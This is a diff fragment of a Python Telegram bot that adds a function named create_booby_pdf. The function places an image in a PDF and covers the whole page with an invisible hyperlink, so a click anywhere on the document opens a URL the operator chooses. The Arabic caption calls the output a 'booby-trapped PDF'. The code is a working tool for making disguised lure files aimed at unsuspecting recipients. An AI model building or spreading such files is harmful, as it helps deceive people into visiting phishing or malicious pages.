+        pdf = FPDF(orientation="P", unit="mm", format="A4")
+        pdf.add_page()
+        pdf.image(photo_path, x=x, y=y, w=new_w, h=new_h)
+
+        # 3. إضافة الرابط (يغطي الصفحة كاملة)
+        pdf.link(0, 0, PAGE_W, PAGE_H, link)
+
+        pdf.output(pdf_path)
+
+        if not os.path.exists(pdf_path) or os.path.getsize(pdf_path) < 100:
+            return False, "فشل إنشاء PDF"
+
+        # 4. إرسال الملف
+        caption = (
+            "✅ <b>تم إنشاء ملف PDF المـلـغم بنجاح!</b>\n\n"
+            f"🔗 <b>الرابط المضمن:</b>\n<a href=\"{link}\">{link}</a>\n\n"
+            "⚠️ <b>عند فتح الملف، الضغط في أي مكان سيفتح الرابط</b>"
+        )
+        with open(pdf_path, "rb") as f:
+            await update.message.reply_document(document=f, caption=caption, parse_mode="HTML")
+
+        # 5. تنظيف
+        try:
+            os.remove(photo_path)
+            os.remove(pdf_path)
+        except:
+            pass
+
+        return True, ""
+
+    except Exception as e:
+        logger.error(f"create_booby_pdf error: {e}")
+        return False, str(e)
     
 # ========== دوال تحميل الفيديوهات ==========
 def ensure_ytdlp_installed():
